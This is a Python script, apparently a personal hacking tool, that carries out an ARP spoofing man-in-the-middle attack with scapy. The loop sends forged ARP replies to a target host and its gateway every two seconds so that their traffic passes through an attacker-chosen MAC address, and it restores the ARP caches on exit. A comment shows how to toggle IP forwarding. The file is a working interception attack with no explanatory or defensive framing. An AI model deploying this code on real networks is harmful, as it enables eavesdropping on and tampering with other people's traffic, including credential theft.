import scapy.all as scapy
import time

###
# echo 0 > /proc/sys/net/ipv4/ip_forward
#OR
# echo 1 > /proc/sys/net/ipv4/ip_forward
###

class ArpSpoofing():
    def __init__(self, getaway ,host):
        print('Arp Spoofing On: ', host['ip'])
        print('MAC: ', host['mac'])
        print('Please send receiver MAC')
        self.receiver_mac = input("=>")
        self.t_IP = host['ip']
        self.t_MAC = host['mac']
        self.g_IP = getaway['ip']
        self.g_MAC = getaway['mac']


        self.start()

    def start(self):
        i = 0
        try:
            while True:
                packet1 = scapy.ARP(op=2, pdst=self.t_IP, hwdst=self.t_MAC, psrc=self.g_IP, hwsrc=self.receiver_mac)
                packet2 = scapy.ARP(op=2, pdst=self.g_IP, hwdst=self.g_MAC, psrc=self.t_IP, hwsrc=self.receiver_mac)
                scapy.send(packet1, verbose=False)
                scapy.send(packet2, verbose=False)
                i += 2
                print("\r[+] Packets Sent: " + str(i), end="")
                time.sleep(2)
        except KeyboardInterrupt:
            packet1 = scapy.ARP(op=2, pdst=self.g_IP, hwdst=self.g_MAC, psrc=self.t_IP, hwsrc=self.t_MAC)
            packet2 = scapy.ARP(op=2, pdst=self.t_IP, hwdst=self.t_MAC, psrc=self.g_IP, hwsrc=self.g_MAC)
            scapy.send(packet1, count=4, verbose=False)
            scapy.send(packet2, count=4, verbose=False)
            print("Bye")